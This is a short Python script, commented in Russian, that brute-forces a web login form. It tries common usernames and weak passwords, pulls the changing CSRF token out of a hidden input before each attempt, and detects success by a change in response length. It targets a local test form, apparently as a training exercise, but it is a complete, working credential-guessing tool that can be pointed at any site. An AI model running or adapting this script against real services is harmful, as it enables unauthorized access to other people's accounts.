import requests
from bs4 import BeautifulSoup


def get_token(page):
    """Данная функция разбивает страницу на элементы с помощью модуля
    bs4 и находит скрытый input и извлекает из него значение, это токен
    который при каждом запросе изменяется"""
    data = BeautifulSoup(page, 'lxml')
    token = data.find('input', type='hidden')['value']
    return token


# Адрес тестовой формы, для запуска php скрипта с формой достаточно в папке
# с формой в консоли выполнить команду: php -S 127.0.0.1:9000
url = 'http://127.0.0.1:9000'

# Логины и пароли, используемые для перебора, их можно заменить на чтение
# из файлов
logins = ['administrator', 'user', 'root', 'admin']
passwords = ['123454', 'admin', 'users', 'root', '987654']

# Данная сессия нужна для того, чтобы извлечь куки из ответа от сервера и
# в дальнейшем отправлять запросы уже с куки
session = requests.session()

# Отправка GET запроса для получения куки и токена
page = session.get(url)
token = get_token(page.text)

# Длина страницы, логин успешно не произошел
failed = len(page.text)

for login in logins:
    for passw in passwords:
        data = {'login': login, 'password': passw, 'token': token}
        page = session.post(url, data=data)
        if len(page.text) != failed:
            print("Login: {}, Password: {}".format(login, passw))
            break
        token = get_token(page.text)
